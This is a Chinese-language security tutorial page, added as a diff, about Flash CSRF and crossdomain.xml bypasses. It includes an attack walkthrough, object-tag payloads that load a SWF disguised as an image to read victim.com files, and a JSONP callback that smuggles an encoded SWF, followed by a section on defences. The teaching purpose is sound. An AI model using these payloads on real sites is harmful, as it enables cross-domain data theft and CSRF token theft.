@@ -1,0 +1,200 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  <title>0x01 简单介绍｜Web 安全 / XSS与客户端｜BEN.OPS</title>
+  <meta name="description" content="0x01 简单介绍。本文属于Web 安全 / XSS与客户端，CSRF的全称是Cross-Site Request Forgery，跨站请求伪造，即第三方冒充当前用户身份发送请求。 Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造，示例请参照…">
+  <meta name="keywords" content="Web 安全，XSS与客户端，Java，CSRF，知识笔记，Web 安全 / XSS与客户端，0x01 简单介绍">
+  <meta name="author" content="BEN">
+  <meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+  <meta name="googlebot" content="index,follow,max-snippet:-1,max-image-preview:large">
+  <meta name="baiduspider" content="index,follow">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <link rel="canonical" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-fa015d8a9e85.html">
+  <link rel="alternate" hreflang="zh-CN" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-fa015d8a9e85.html">
+  <link rel="alternate" type="text/markdown" href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141600-Web%20%E5%AE%89%E5%85%A8%2BXSS%E4%B8%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%2BJava%2BCSRF-0x01%20%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D.md">
+  <link rel="alternate" type="application/rss+xml" title="BEN.OPS RSS" href="https://ben2023niao.github.io/ben-ops-notes/assets/rss.xml">
+  <link rel="alternate" type="application/xml" title="BEN.OPS Sitemap" href="https://ben2023niao.github.io/ben-ops-notes/assets/sitemap.xml">
+  <link rel="author" href="https://t.me/Ben_Bird">
+  <meta property="og:type" content="article">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:site_name" content="BEN.OPS 工程笔记">
+  <meta property="og:title" content="0x01 简单介绍">
+  <meta property="og:description" content="0x01 简单介绍。本文属于Web 安全 / XSS与客户端，CSRF的全称是Cross-Site Request Forgery，跨站请求伪造，即第三方冒充当前用户身份发送请求。 Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造，示例请参照…">
+  <meta property="og:url" content="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-fa015d8a9e85.html">
+  <meta property="article:published_time" content="2023-04-14T16:00:00">
+  <meta property="article:modified_time" content="2023-04-14 16:00">
+  <meta property="article:section" content="Web 安全 / XSS与客户端">
+  <meta property="article:author" content="https://t.me/Ben_Bird">
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="0x01 简单介绍">
+  <meta name="twitter:description" content="0x01 简单介绍。本文属于Web 安全 / XSS与客户端，CSRF的全称是Cross-Site Request Forgery，跨站请求伪造，即第三方冒充当前用户身份发送请求。 Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造，示例请参照…">
+  
+  <style>:root{color-scheme:light dark;--bg:#f4f0e8;--panel:#fffdf8;--bg2:#e8e1d6;--fg:#202621;--muted:#66736b;
+--line:#d4cbbd;--accent:#176b55;--accent2:#0b6094;--code:#17211d;--codefg:#d8f0e4;--warn:#9b5c12;
+--max:1120px}@media(prefers-color-scheme:dark){:root{--bg:#111713;--panel:#18201b;--bg2:#202b24;
+--fg:#dce9df;--muted:#9aad9f;--line:#314238;--accent:#67d4ad;--accent2:#76b9df;--code:#0a100d;
+--codefg:#cceadd;--warn:#f0b35c}}*{box-sizing:border-box}html{scroll-behavior:smooth;background:var(--bg)}
+body{margin:0;background:radial-gradient(circle at 15% 0,color-mix(in srgb,var(--accent) 8%,transparent),transparent 32rem),var(--bg);
+color:var(--fg);font:16px/1.82 ui-sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif}
+a{color:var(--accent);text-underline-offset:.22em}a:hover{color:var(--accent2)}.shell{width:min(var(--max),calc(100% - 32px));margin:auto}
+.topbar{position:sticky;top:0;z-index:5;border-bottom:1px solid var(--line);background:color-mix(in srgb,var(--bg) 88%,transparent);
+backdrop-filter:blur(14px)}.topbar .shell{min-height:62px;display:flex;align-items:center;gap:18px}.brand{font:700 1rem/1 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--fg);text-decoration:none;letter-spacing:.04em}.brand b{color:var(--accent)}.topbar nav{margin-left:auto;display:flex;gap:16px;flex-wrap:wrap;font-size:.9rem}
+main{padding:34px 0 64px}.crumbs{font-size:.84rem;color:var(--muted);margin-bottom:18px}.hero{border:1px solid var(--line);background:var(--panel);
+border-radius:16px;padding:clamp(20px,4vw,42px);box-shadow:0 16px 50px #0000000a}.eyebrow{font:700 .74rem/1.2 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--accent);letter-spacing:.12em;text-transform:uppercase}.hero h1{font-size:clamp(1.8rem,4.4vw,3.2rem);line-height:1.2;margin:.55rem 0 1rem;
+letter-spacing:-.025em;overflow-wrap:anywhere}.lede{font-size:1.04rem;color:var(--muted);max-width:75ch;margin:0 0 18px}.meta{display:flex;flex-wrap:wrap;gap:8px}
+.badge{display:inline-flex;align-items:center;border:1px solid var(--line);border-radius:999px;padding:.22rem .68rem;background:var(--bg2);
+font-size:.78rem;color:var(--fg);text-decoration:none}.layout{margin-top:24px;display:grid;grid-template-columns:minmax(0,1fr) 260px;gap:24px;align-items:start}
+.article,.aside-box,.seo-summary{border:1px solid var(--line);background:var(--panel);border-radius:14px}.article{padding:clamp(20px,4vw,48px);min-width:0}
+.article h1,.article h2,.article h3,.article h4{line-height:1.35;letter-spacing:-.012em;scroll-margin-top:80px}.article h2{margin-top:2.2em;padding-top:.6em;
+border-top:1px solid var(--line)}.article h1{display:none}.article img{display:block;max-width:100%;height:auto;margin:1.4rem auto;border-radius:8px}
+.article pre{overflow:auto;background:var(--code);color:var(--codefg);padding:16px;border-radius:9px;line-height:1.6}
+.article code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.9em}.article :not(pre)>code{background:var(--bg2);padding:.12em .34em;border-radius:4px}
+.article table{display:block;max-width:100%;overflow:auto;border-collapse:collapse}.article th,.article td{border:1px solid var(--line);padding:.45rem .65rem}
+.article blockquote{margin:1.4rem 0;padding:.4rem 1rem;border-left:4px solid var(--accent);background:var(--bg2);color:var(--muted)}
+.article hr{border:0;border-top:1px solid var(--line);margin:2rem 0}.aside{position:sticky;top:82px;display:grid;gap:14px}
+.aside-box{padding:16px}.aside-box h2{font-size:.83rem;margin:0 0 12px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+.aside-box ol,.aside-box ul{margin:0;padding-left:1.15rem}.aside-box li{margin:.5rem 0;font-size:.9rem}.aside-box a{text-decoration:none}
+.seo-summary{margin-top:24px;padding:20px 24px}.seo-summary h2{font-size:1rem;margin:0 0 .65rem}.seo-summary p{margin:0;color:var(--muted)}
+.pager{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:24px}.pager a{border:1px solid var(--line);border-radius:12px;
+padding:14px 16px;background:var(--panel);text-decoration:none}.pager a:last-child{text-align:right}.pager small{display:block;color:var(--muted)}
+footer{padding:28px 0 48px;border-top:1px solid var(--line);color:var(--muted);font-size:.88rem}footer .shell{display:flex;gap:16px;flex-wrap:wrap}
+.index-hero h1{font-size:clamp(2.1rem,6vw,4.4rem)}.stat-grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px;margin-top:20px}
+.stat{border:1px solid var(--line);background:var(--bg2);border-radius:10px;padding:12px}.stat strong{display:block;font:700 1.35rem/1.2 ui-monospace,monospace}
+.stat span{font-size:.78rem;color:var(--muted)}.year{margin-top:34px}.year>h2{position:sticky;top:62px;z-index:2;margin:0;padding:12px 0;
+background:color-mix(in srgb,var(--bg) 92%,transparent);backdrop-filter:blur(8px);font:700 1.25rem/1.2 ui-monospace,monospace}
+.cards{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px}.card{border:1px solid var(--line);background:var(--panel);border-radius:12px;padding:18px}
+.card h3{font-size:1.02rem;line-height:1.45;margin:.35rem 0 .55rem}.card h3 a{text-decoration:none}.card p{margin:.45rem 0;color:var(--muted);font-size:.87rem}
+.card .date{font:600 .77rem/1 ui-monospace,monospace;color:var(--accent)}.tags{display:flex;flex-wrap:wrap;gap:5px}.tag{font-size:.72rem;color:var(--muted);border:1px solid var(--line);
+border-radius:99px;padding:.12rem .48rem}@media(max-width:860px){.layout{grid-template-columns:1fr}.aside{position:static;grid-row:1}.cards{grid-template-columns:1fr}}
+@media(max-width:620px){body{font-size:15px}.shell{width:min(100% - 22px,var(--max))}.topbar nav{gap:10px;font-size:.8rem}.hero,.article{padding:18px}
+.meta{gap:6px}.stat-grid{grid-template-columns:repeat(2,1fr)}.pager{grid-template-columns:1fr}.pager a:last-child{text-align:left}}
+@media print{.topbar,.aside,.pager,footer{display:none}.shell{width:100%}.article,.hero{border:0;box-shadow:none;padding:0}}</style>
+  <script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","@id":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-fa015d8a9e85.html#article","headline":"0x01 简单介绍","description":"0x01 简单介绍。本文属于Web 安全 / XSS与客户端，CSRF的全称是Cross-Site Request Forgery，跨站请求伪造，即第三方冒充当前用户身份发送请求。 Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造，示例请参照…","datePublished":"2023-04-14T16:00:00","dateModified":"2023-04-14 16:00","inLanguage":"zh-CN","articleSection":["Web 安全","XSS与客户端"],"keywords":["Web 安全","XSS与客户端","Java","CSRF","知识笔记","Web 安全 / XSS与客户端","0x01 简单介绍"],"wordCount":1532,"mainEntityOfPage":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-fa015d8a9e85.html","url":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-fa015d8a9e85.html","author":{"@type":"Person","name":"BEN","url":"https://t.me/Ben_Bird"},"publisher":{"@type":"Organization","name":"BEN.OPS 工程笔记","url":"https://ben2023niao.github.io/ben-ops-notes/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"BEN.OPS 工程笔记","item":"https://ben2023niao.github.io/ben-ops-notes/"},{"@type":"ListItem","position":2,"name":"Web 安全 / XSS与客户端","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html"},{"@type":"ListItem","position":3,"name":"0x01 简单介绍","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-fa015d8a9e85.html"}]}]}</script>
+</head>
+<body>
+  <header class="topbar"><div class="shell">
+    <a class="brand" href="https://ben2023niao.github.io/ben-ops-notes/"><b>$_</b> BEN.OPS</a>
+    <nav aria-label="站点导航">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">交互知识库</a>
+      <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">静态文章索引</a>
+      <a href="https://t.me/Ben_Bird">@Ben_Bird</a>
+    </nav>
+  </div></header>
+  <main class="shell">
+    <nav class="crumbs" aria-label="面包屑">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">首页</a> › <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">工程笔记</a>
+      › <span>Web 安全 / XSS与客户端</span> › <span>0x01 简单介绍</span>
+    </nav>
+    <header class="hero">
+      <div class="eyebrow">Web 安全 / XSS与客户端</div>
+      <h1>0x01 简单介绍</h1>
+      <p class="lede">0x01 简单介绍。本文属于Web 安全 / XSS与客户端，CSRF的全称是Cross-Site Request Forgery，跨站请求伪造，即第三方冒充当前用户身份发送请求。 Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造，示例请参照…</p>
+      <div class="meta">
+        <time class="badge" datetime="2023-04-14T16:00:00">发布于 2023-04-14</time>
+        <span class="badge">作者 BEN</span>
+        <span class="badge">1,532 字</span>
+        <span class="badge">5 分钟阅读</span>
+      </div>
+    </header>
+    <div class="layout">
+      <article class="article" itemscope itemtype="https://schema.org/TechArticle">
+        
+<h2 id="0x01-简单介绍">0x01 简单介绍</h2>
+<p>CSRF的全称是Cross-Site Request Forgery，跨站请求伪造，即第三方冒充当前用户身份发送请求。
+Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造，示例请参照<a href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141600-Web%20%E5%AE%89%E5%85%A8%2BXSS%E4%B8%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%2BPHP%2BJava-%E4%B8%80%E3%80%81%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E.md" rel="noopener noreferrer">CSRF</a></p>
+<h2 id="0x02-flash的跨域策略">0x02  flash的跨域策略</h2>
+<p>adobe为了限制flash加载任意页面，使用了一种跨域策略来进行限制。
+所谓的flash跨域策略文件就是在站点根目录的crossdomain.xml，这个XML文件配置当前站点的资源允许来自哪些域的flash加载。当flash加载一个站点的资源时，如果目标不跟自己一个站点，flash就会自动去访问目标站点根目录下的crossdomain.xml文件，如果crossdomain.xml中的allow-access-from domain标签包含flash所在网站，那么flash就可以加载该内容。
+一个crossdomain.xml文件可能是这样的：</p>
+<pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;cross-domain-policy&gt;
+&lt;allow-access-from domain="*.example.com" /&gt;
+&lt;allow-access-from domain="www.test.com" secure="true" /&gt;
+&lt;/cross-domain-policy&gt;
+</code></pre>
+<p>以上策略就是允许来自*.example.com、www.test.com 的flash加载资源。secure="true" 的意思是只允许通过安全链接来请求本域的数据。在站点不存在crossdomain.xml文件的情况，允许flash主动加载目标站点的其他XML文件作为跨域策略文件。比如，flash9中可以使用Security.loadPolicyFile加载目标站点的其他文件作为跨域策略文件。如果没有跨域策略文件许可，那么flash就不能加载该站点的内容。</p>
+<h2 id="0x03-如何绕过跨域限制">0x03  如何绕过跨域限制</h2>
+<p>我们要进行CSRF，可能需要获取目标站点某些页面中的内容，这个时候就得想办法绕过flash的跨域策略。
+- 最简单的情况是目标站点本身没有安全意识，允许任意flash加载内容那就没话说了（allow-access-from domain="*"）。
+- 还有就是目标站点根目录没有crossdomain.xml，那就看看能否找到上传文件的地方传一个同样格式的文件上去，然后用Security.loadPolicyFile加载之。这里貌似flash有通过Content-Type来判断，所以要文本类型的才有效。
+- 在目标站点没有crossdomain.xml 情况下，在目标站点上传一个swf（文件后缀不重要），在 evil站点以 object 标签加载，这样swf 发出的请求其实是目标站点的同域请求，可以读取返回的数据。</p>
+<blockquote>
+<p>If a Flash file (bogus image file) is uploaded on victim.com and then embedded at attacker.com, the Flash file can execute JavaScript within the domain of attacker.com. However, if the Flash file sends requests, it will be allowed to read files within the domain of victim.com.</p>
+<p>A SWF’s origin is the domain from which it was retrieved from, similar to a Java applet (uses IP addresses instead of domain names though), therefore a malicious page could embed a SWF, which originates from the target’s domain that could make arbitrary requests to the target domain and read the responses (steal sensitive data, defeat CSRF protections, and other generally nasty actions).</p>
+</blockquote>
+<p>Based on these facts we can create an attack scenario like this:</p>
+<pre><code>An attacker creates a malicious Flash (SWF) file
+The attacker changes the file extension to JPG
+The attacker uploads the file to victim.com
+The attacker embeds the file on attacker.com using an &lt;object&gt; tag with type "application/x-shockwave-flash"
+The victim visits attacker.com, loads the file as embedded with the &lt;object&gt; tag
+The attacker can now send and receive arbitrary requests to victim.com using the victims session
+The attacker sends a request to victim.com and extracts the CSRF token from the response
+</code></pre>
+<p>A payload could look like this:</p>
+<pre><code class="language-html">&lt;object style="height:1px;width:1px;" data="http://victim.com/user/2292/profilepicture.jpg"
+type="application/x-shockwave-flash" allowscriptaccess="always" flashvars="c=read&amp;u=http://victim.com/
+secret_file.txt"&gt;&lt;/object&gt;
+</code></pre>
+<p>假如目标站点也找不到上传文件的地方，如果存在 jsonp 接口，也是可以直接利用的，我们把编译好的swf 代码当作callback 的参数，如下</p>
+<pre><code class="language-html">&lt;object style="height:1px;width:1px;" data="http://viticm.com/user/get?type=jsonp&amp;callback=
+CWS%07%0E000x%9C%3D%8D1N%C3%40%10E%DF%AE%8D%BDI%08%29%D3%40%1D%A0%A2%05%09%11%89HiP%22%05D%8BF%8E%0BG%26%1B%D9%8E%
+117%A0%A2%DC%82%8A%1Br%04X%3B%21S%8C%FE%CC%9B%F9%FF%AA%CB7Jq%AF%7F%ED%F2%2E%F8%01%3E%9E%18p%C9c%9Al
+%8B%ACzG%F2%DC%BEM%EC%ABdkj%1E%AC%2C%9F%A5%28%B1%EB%89T%C2Jj%29%93%22%DBT7%24%9C%8FH%CBD6%29%A3%0Bx%29
+%AC%AD%D8%92%FB%1F%5C%07C%AC%7C%80Q%A7Nc%F4b%E8%FA%98%20b%5F%26%1C%9F5%20h%F1%D1g%0F%14%C1%0A%5Ds%8D%8B0Q
+%A8L%3C%9B6%D4L%BD%5F%A8w%7E%9D%5B%17%F3%2F%5B%DCm%7B%EF%CB%EF%E6%8D%3An%2D%FB%B3%C3%DD%2E%E3d1d%EC%C7%3F6
+%CD0%09" type="application/x-shockwave-flash" allowscriptaccess="always"
+flashvars="c=alert&amp;u=http://mywebsite.example.com/secret_file.txt"&gt;&lt;/object&gt;
+</code></pre>
+<ul>
+<li>最后一种情况是有crossdomain.xml，而且配置得很好。这个时候就要稍微麻烦一点，那我们就去找它支持flash加载的站点是否可以上传文件，上传我们精心构造的flash就好了。后缀倒无所谓：如果是以object标签调用flash的话任意后缀就可以；以embed调用的话除了jpg、jpeg、gif等少数后缀不支持外其他都可以。也就是说在一个中间站点上传文件，evil 站点加载中间站点的swf，swf 去请求目标站点的内容，因为swf 与中间站点同域，而这个域在 crossdomain.xml 允许的范围内，故可以成功。</li>
+</ul>
+<h2 id="0x04-如何防御">0x04  如何防御</h2>
+<ul>
+<li>Web程序中可以通过请求的来源进行判断：通过正常页面过来的referer我们已知的，flash过来的请求referer为空或者是swf文件地址。另外，flash发送请求的时候也会在HTTP头中带上x-flash-version标识版本。</li>
+<li>So if you allow file uploads or printing arbitrary user data in your service, you should always verify the contents as well as sending a Content-Disposition header where applicable. e.g
+<code>Content-Disposition: attachment; filename="image.jpg"</code>
+Isolating the domain of the uploaded files is also a good solution as long as the crossdomain.xml file of the main website does not include the isolated domain.</li>
+<li>站点根目录的crossdomain.xml文件要配置好，尽量精确到子域，缩小被攻击面。</li>
+</ul>
+<h2 id="Reference">Reference</h2>
+<p><a href="https://labs.detectify.com/2014/05/20/the-lesser-known-pitfalls-of-allowing-file-uploads-on-your-website/" rel="noopener noreferrer">the-lesser-known-pitfalls-of-allowing-file-uploads-on-your-website</a>
+<a href="https://soroush.secproject.com/blog/2014/05/even-uploading-a-jpg-file-can-lead-to-cross-domain-data-hijacking-client-side-attack/" rel="noopener noreferrer">Even uploading a JPG file can lead to Cross Domain Data Hijacking</a>
+<a href="http://d3adend.org/blog/?p=242" rel="noopener noreferrer">Content-Type Blues</a>
+<a href="https://github.com/nccgroup/CrossSiteContentHijacking" rel="noopener noreferrer">CrossSiteContentHijacking</a></p>
+      </article>
+      <aside class="aside">
+        <aside class="aside-box"><h2>本页目录</h2><ol><li style="margin-left:0.0rem"><a href="#0x01-简单介绍">0x01 简单介绍</a></li><li style="margin-left:0.0rem"><a href="#0x02-flash的跨域策略">0x02 flash的跨域策略</a></li><li style="margin-left:0.0rem"><a href="#0x03-如何绕过跨域限制">0x03 如何绕过跨域限制</a></li><li style="margin-left:0.0rem"><a href="#0x04-如何防御">0x04 如何防御</a></li><li style="margin-left:0.0rem"><a href="#Reference">Reference</a></li></ol></aside>
+        <div class="aside-box"><h2>文章信息</h2><ul>
+          <li>分类：Web 安全 / XSS与客户端</li>
+          <li>日期：2023-04-14</li>
+          <li>标签：<span class="tag">Web 安全</span><span class="tag">XSS与客户端</span><span class="tag">Java</span><span class="tag">CSRF</span><span class="tag">知识笔记</span></li>
+          <li><span>来源：01-Web安全/03-XSS与客户端/Flash安全/Flash CSRF.md</span></li><li><a href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141600-Web%20%E5%AE%89%E5%85%A8%2BXSS%E4%B8%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%2BJava%2BCSRF-0x01%20%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D.md" type="text/markdown">查看 Markdown 原文</a></li>
+        </ul></div>
+        <div class="aside-box"><h2>作者</h2>
+          <p><a href="https://t.me/Ben_Bird">@Ben_Bird</a></p>
+          <p>Linux / DevOps / SRE / 云平台 / 安全运维</p>
+        </div>
+      </aside>
+    </div>
+    <section class="seo-summary" aria-labelledby="seo-summary-title">
+      <h2 id="seo-summary-title">文章摘要</h2>
+      <p>0x01 简单介绍。本文属于Web 安全 / XSS与客户端，CSRF的全称是Cross-Site Request Forgery，跨站请求伪造，即第三方冒充当前用户身份发送请求。 Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造，示例请参照…</p>
+      <p>关键词：Web 安全、XSS与客户端、Java、CSRF、知识笔记、Web 安全 / XSS与客户端、0x01 简单介绍</p>
+    </section>
+    <nav class="pager" aria-label="文章翻页"><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-5eb052f3e913.html"><small>上一篇</small>0x01 正向和反向代理</a><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-f32de75219b8.html"><small>下一篇</small>0x01 身份认证安全</a></nav>
+  </main>
+  <footer><div class="shell">
+    <span>© 2026 BEN.OPS</span>
+    <a href="https://github.com/ben2023niao/ben-ops-notes">GitHub</a>
+    <a href="https://t.me/Ben_Bird">Telegram @Ben_Bird</a>
+    <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-fa015d8a9e85.html">本页永久链接</a>
+  </div></footer>
+</body>
+</html>
